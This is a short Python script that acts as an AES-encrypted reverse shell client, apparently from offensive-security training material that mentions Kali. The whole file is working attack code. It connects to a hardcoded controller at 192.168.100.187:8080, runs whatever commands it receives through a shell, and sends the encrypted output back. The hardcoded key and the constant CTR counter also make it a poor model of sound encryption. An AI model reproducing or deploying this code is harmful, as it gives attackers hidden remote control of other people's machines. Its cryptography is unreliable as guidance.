# Download Pycrypto for Windows - pycrypto 2.6 for win32 py 2.7
# http://www.voidspace.org.uk/python/modules.shtml#pycrypto

# Download Pycrypto source
# https://pypi.python.org/pypi/pycrypto
# For Kali, after extract the tar file, invoke "python setup.py install"

import socket                    
import subprocess                 

from Crypto.Cipher import AES

# hardcoded values for that example
counter = "H"*16
key = "H"*32



def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 
 

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # to prevent "socket.error: [Errno 98] Address already in use" (socket is in a TIME_WAIT state)
    # we set a flag to prevent this
    # SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    s.connect(('192.168.100.187', 8080))

    while True:
        command = decrypt(s.recv(1024))
        print 'We received: ' +  command

        if 'terminate' in command:
            s.close()
            break

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(encrypt(CMD.stdout.read()))
            s.send(encrypt(CMD.stderr.read()))

def main():
    connect()
    
main()











